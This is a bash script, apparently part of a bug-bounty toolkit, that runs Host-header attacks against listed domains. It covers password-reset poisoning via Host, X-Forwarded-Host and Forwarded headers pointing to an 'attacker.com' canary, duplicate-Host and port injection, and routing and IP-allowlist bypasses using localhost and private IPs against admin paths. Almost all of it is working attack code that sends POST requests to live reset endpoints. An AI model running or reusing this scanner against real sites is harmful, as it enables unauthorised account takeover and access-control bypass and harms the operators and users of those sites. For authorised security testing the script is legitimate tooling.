#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  ct_host_header.sh — Host Header Attacks                     ║
# ║  Password reset poison · routing abuse · vhost enumeration   ║
# ║  Multiple Host headers · absolute URL technique              ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="ct_host_header.sh"
SCRIPT_DESC="Host Header Attacks"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test Host header manipulation for password reset poisoning,"
    echo "  routing abuse, vhost access, and IP whitelisting bypass."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  --domains FILE         File with domains (one per line)"
    echo "  -u, --urls FILE        File with URLs to test (one per line)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "6" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${DOMAINS_FILE:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain, --domains, or --urls"
    script_usage
    exit 1
fi

# ── Build domain list ─────────────────────────────────────────
DOMAIN_LIST="${OUT_DIR}/_ct_host_domains.txt"
> "$DOMAIN_LIST"

if [ -n "${DOMAINS_FILE:-}" ] && [ -f "$DOMAINS_FILE" ]; then
    sed 's/\*\.//' "$DOMAINS_FILE" | sort -u >> "$DOMAIN_LIST"
fi
if [ -n "${DOMAIN:-}" ]; then
    echo "$DOMAIN" | sed 's/\*\.//' >> "$DOMAIN_LIST"
fi
sort -u -o "$DOMAIN_LIST" "$DOMAIN_LIST"

domain_count=$(count_lines "$DOMAIN_LIST")
info "Testing ${domain_count} domain(s) for Host header attacks"

# ── Output file ───────────────────────────────────────────────
FINDINGS_FILE="${OUT_DIR}/ct_host_header_findings.txt"
> "$FINDINGS_FILE"

# ── Canary domain for injection testing ───────────────────────
CANARY_DOMAIN="evil-${RANDOM}.attacker.com"

# ── Common password reset paths ───────────────────────────────
RESET_PATHS=(
    "/password/reset"
    "/forgot-password"
    "/forgot_password"
    "/auth/forgot"
    "/users/password"
    "/account/recovery"
    "/reset-password"
    "/resetpassword"
    "/api/auth/forgot"
    "/api/password/reset"
    "/api/v1/auth/forgot-password"
    "/api/v1/users/reset-password"
)

# ── Common login / auth paths ─────────────────────────────────
AUTH_PATHS=(
    "/"
    "/login"
    "/auth"
    "/signin"
    "/api/auth"
    "/oauth/authorize"
    "/sso/login"
)

# ── Restricted paths for routing bypass ───────────────────────
RESTRICTED_PATHS=(
    "/admin"
    "/internal"
    "/management"
    "/console"
    "/debug"
    "/actuator"
    "/server-status"
)

# ── Helper: check if canary appears in response ──────────────
check_reflection() {
    local response="$1"
    local canary="$2"
    if echo "$response" | grep -qi "$canary"; then
        return 0
    fi
    return 1
}

# ── Main testing loop ────────────────────────────────────────
tested=0

while IFS= read -r domain; do
    [ -z "$domain" ] && continue
    ((tested++)) || true

    info "[${tested}/${domain_count}] Testing: ${domain}"

    # Determine working scheme
    scheme="https"
    http_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" "https://${domain}/" 2>/dev/null || echo "000")
    if [ "$http_code" = "000" ]; then
        scheme="http"
        http_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "http://${domain}/" 2>/dev/null || echo "000")
    fi
    if [ "$http_code" = "000" ]; then
        warn "  ${domain} not reachable, skipping"
        continue
    fi

    base_url="${scheme}://${domain}"

    # ═══════════════════════════════════════════════════════════
    # Test 1: X-Forwarded-Host reflection on main page
    # ═══════════════════════════════════════════════════════════
    info "  Testing X-Forwarded-Host reflection..."

    xfh_canary="xfh${RANDOM}${RANDOM}"
    for path in "${AUTH_PATHS[@]}"; do
        url="${base_url}${path}"

        resp=$(curl -sk --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "X-Forwarded-Host: ${xfh_canary}.${CANARY_DOMAIN}" \
            "$url" 2>/dev/null || echo "")

        if check_reflection "$resp" "$xfh_canary"; then
            echo "[HIGH] X-FORWARDED-HOST REFLECTED: ${url} | Canary: ${xfh_canary}" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH]${NC} X-Forwarded-Host reflected at ${url}"

            # Check if it's in a link/redirect (high impact for password reset poisoning)
            if echo "$resp" | grep -qiP "(href|src|action|redirect|location).*${xfh_canary}"; then
                echo "[CRITICAL] X-FORWARDED-HOST IN LINK: ${url} | Used in href/redirect/action" >> "$FINDINGS_FILE"
                warn "  ${RED}[CRITICAL]${NC} X-Forwarded-Host injected into link at ${url}"
            fi
        fi
    done

    # ═══════════════════════════════════════════════════════════
    # Test 2: Password reset poisoning
    # ═══════════════════════════════════════════════════════════
    info "  Testing password reset poisoning..."

    for path in "${RESET_PATHS[@]}"; do
        url="${base_url}${path}"

        # Check if endpoint exists first
        exists_code=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")

        # Skip 404s and connection failures
        if [[ "$exists_code" =~ ^(000|404|405)$ ]]; then
            continue
        fi

        reset_canary="reset${RANDOM}"

        # Test with modified Host header
        for host_header in \
            "-H 'Host: ${reset_canary}.${CANARY_DOMAIN}'" \
            "-H 'X-Forwarded-Host: ${reset_canary}.${CANARY_DOMAIN}'" \
            "-H 'X-Host: ${reset_canary}.${CANARY_DOMAIN}'" \
            "-H 'X-Original-Host: ${reset_canary}.${CANARY_DOMAIN}'" \
            "-H 'Forwarded: host=${reset_canary}.${CANARY_DOMAIN}'"
        do
            header_name=$(echo "$host_header" | grep -oP "(?<=')[^:]+(?=:)")

            resp=$(eval curl -sk -D- --connect-timeout 8 --max-time 15 \
                "\"${HUNT_UA_CURL[@]}\"" \
                "$host_header" \
                -X POST \
                -H "'Content-Type: application/x-www-form-urlencoded'" \
                -d "'email=test@example.com'" \
                "'$url'" 2>/dev/null || echo "")

            if [ -n "$resp" ]; then
                resp_status=$(echo "$resp" | head -1 | grep -oP '\d{3}' | head -1)

                if check_reflection "$resp" "$reset_canary"; then
                    echo "[CRITICAL] PASSWORD RESET POISON: ${url} | Header: ${header_name} | Status: ${resp_status}" >> "$FINDINGS_FILE"
                    warn "  ${RED}[CRITICAL]${NC} Password reset poisoning via ${header_name} at ${url}"
                fi

                # Check Location header for redirect poisoning
                location=$(echo "$resp" | grep -i '^location:' | head -1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r')
                if echo "$location" | grep -qi "$reset_canary"; then
                    echo "[CRITICAL] RESET REDIRECT POISON: ${url} | Header: ${header_name} | Redirect: ${location}" >> "$FINDINGS_FILE"
                    warn "  ${RED}[CRITICAL]${NC} Reset redirect to attacker host via ${header_name}"
                fi
            fi
        done
    done

    # ═══════════════════════════════════════════════════════════
    # Test 3: Multiple Host headers
    # ═══════════════════════════════════════════════════════════
    info "  Testing duplicate Host headers..."

    dup_canary="dup${RANDOM}"
    # curl sends the last -H Host header; test if server uses first or second
    resp=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "Host: ${domain}" \
        -H "Host: ${dup_canary}.${CANARY_DOMAIN}" \
        "${base_url}/" 2>/dev/null || echo "")

    if check_reflection "$resp" "$dup_canary"; then
        echo "[HIGH] DUPLICATE HOST REFLECTED: ${base_url}/ | Second Host header used" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} Duplicate Host header reflected at ${base_url}/"
    fi

    # Test reverse order
    resp2=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "Host: ${dup_canary}.${CANARY_DOMAIN}" \
        -H "Host: ${domain}" \
        "${base_url}/" 2>/dev/null || echo "")

    if check_reflection "$resp2" "$dup_canary"; then
        echo "[HIGH] DUPLICATE HOST (REVERSE) REFLECTED: ${base_url}/ | First Host header used" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} Duplicate Host (reverse order) reflected at ${base_url}/"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 4: Host header with port injection
    # ═══════════════════════════════════════════════════════════
    info "  Testing Host header port injection..."

    port_canary="port${RANDOM}"
    for port_payload in "${domain}:1337" "${domain}:@${CANARY_DOMAIN}" "${domain}:${port_canary}"; do
        resp=$(curl -sk --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "Host: ${port_payload}" \
            "${base_url}/" 2>/dev/null || echo "")

        if echo "$resp" | grep -qi ":1337\|${port_canary}\|${CANARY_DOMAIN}"; then
            echo "[MEDIUM] HOST PORT INJECTION: ${base_url}/ | Payload: ${port_payload}" >> "$FINDINGS_FILE"
            log "  ${YELLOW}[MEDIUM]${NC} Host port injection reflected: ${port_payload}"
        fi
    done

    # ═══════════════════════════════════════════════════════════
    # Test 5: Routing abuse with X-Forwarded-Host for restricted paths
    # ═══════════════════════════════════════════════════════════
    info "  Testing routing abuse for restricted paths..."

    for path in "${RESTRICTED_PATHS[@]}"; do
        url="${base_url}${path}"

        # Normal request
        normal_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")

        # Skip paths that are already accessible or dead
        if [ "$normal_status" = "200" ] || [ "$normal_status" = "000" ]; then
            continue
        fi

        # X-Forwarded-Host: localhost
        xfh_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "X-Forwarded-Host: localhost" \
            "$url" 2>/dev/null || echo "000")

        if [ "$xfh_status" = "200" ] && [ "$normal_status" != "200" ]; then
            echo "[HIGH] ROUTING BYPASS via X-Forwarded-Host:localhost: ${url} | Normal: ${normal_status} | XFH: ${xfh_status}" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH]${NC} Routing bypass: ${url} (${normal_status} -> ${xfh_status})"
        fi

        # Host: localhost
        localhost_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" \
            -H "Host: localhost" \
            "$url" 2>/dev/null || echo "000")

        if [ "$localhost_status" = "200" ] && [ "$normal_status" != "200" ]; then
            echo "[HIGH] ROUTING BYPASS via Host:localhost: ${url} | Normal: ${normal_status} | LH: ${localhost_status}" >> "$FINDINGS_FILE"
            warn "  ${RED}[HIGH]${NC} Host:localhost bypass: ${url} (${normal_status} -> ${localhost_status})"
        fi
    done

    # ═══════════════════════════════════════════════════════════
    # Test 6: X-Forwarded-For IP whitelisting bypass
    # ═══════════════════════════════════════════════════════════
    info "  Testing X-Forwarded-For IP whitelisting bypass..."

    IP_PAYLOADS=("127.0.0.1" "10.0.0.1" "172.16.0.1" "192.168.1.1" "0.0.0.0" "::1")

    for path in "${RESTRICTED_PATHS[@]}"; do
        url="${base_url}${path}"
        normal_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
            "${HUNT_UA_CURL[@]}" "$url" 2>/dev/null || echo "000")

        if [[ ! "$normal_status" =~ ^(403|401)$ ]]; then
            continue
        fi

        for ip in "${IP_PAYLOADS[@]}"; do
            xff_status=$(curl -sk -o /dev/null -w "%{http_code}" --connect-timeout 8 --max-time 15 \
                "${HUNT_UA_CURL[@]}" \
                -H "X-Forwarded-For: ${ip}" \
                -H "X-Real-IP: ${ip}" \
                -H "X-Client-IP: ${ip}" \
                "$url" 2>/dev/null || echo "000")

            if [ "$xff_status" = "200" ]; then
                echo "[HIGH] IP WHITELIST BYPASS: ${url} | IP: ${ip} | Normal: ${normal_status} | XFF: ${xff_status}" >> "$FINDINGS_FILE"
                warn "  ${RED}[HIGH]${NC} IP whitelist bypass: ${url} with ${ip}"
                break  # One bypass per path is sufficient
            fi
        done
    done

    # ═══════════════════════════════════════════════════════════
    # Test 7: Absolute URL technique
    # ═══════════════════════════════════════════════════════════
    info "  Testing absolute URL in request line..."

    # Test if server accepts absolute URI with different Host
    abs_canary="abs${RANDOM}"
    abs_resp=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        --request-target "http://${abs_canary}.${CANARY_DOMAIN}/" \
        "${base_url}/" 2>/dev/null || echo "")

    if check_reflection "$abs_resp" "$abs_canary"; then
        echo "[HIGH] ABSOLUTE URL REFLECTION: ${base_url}/ | Canary: ${abs_canary}" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} Absolute URL technique reflected at ${base_url}/"
    fi

    # ═══════════════════════════════════════════════════════════
    # Test 8: Forwarded header (RFC 7239)
    # ═══════════════════════════════════════════════════════════
    info "  Testing Forwarded header (RFC 7239)..."

    fwd_canary="fwd${RANDOM}"
    resp=$(curl -sk --connect-timeout 8 --max-time 15 \
        "${HUNT_UA_CURL[@]}" \
        -H "Forwarded: host=${fwd_canary}.${CANARY_DOMAIN};proto=https" \
        "${base_url}/" 2>/dev/null || echo "")

    if check_reflection "$resp" "$fwd_canary"; then
        echo "[HIGH] FORWARDED HEADER REFLECTED: ${base_url}/ | Canary: ${fwd_canary}" >> "$FINDINGS_FILE"
        warn "  ${RED}[HIGH]${NC} Forwarded header reflected at ${base_url}/"
    fi

done < "$DOMAIN_LIST"

# ── Cleanup ───────────────────────────────────────────────────
rm -f "$DOMAIN_LIST"

# ── Summary ───────────────────────────────────────────────────
if [ -s "$FINDINGS_FILE" ]; then
    sort -u -o "$FINDINGS_FILE" "$FINDINGS_FILE"
fi
finding_count=$(count_lines "$FINDINGS_FILE")
critical_count=$(grep -c '^\[CRITICAL\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
high_count=$(grep -c '^\[HIGH\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)
medium_count=$(grep -c '^\[MEDIUM\]' "$FINDINGS_FILE" 2>/dev/null || echo 0)

log "Host header attacks: ${finding_count} total findings"
log "  CRITICAL (reset poison/link injection): ${critical_count}"
log "  HIGH (reflection/routing bypass):       ${high_count}"
log "  MEDIUM (port injection/info):           ${medium_count}"
log "Tested ${tested} domains"
if [ "$critical_count" -gt 0 ]; then
    warn "Password reset poisoning or critical Host injection found — prepare PoC"
fi
log "Results: ${FINDINGS_FILE}"
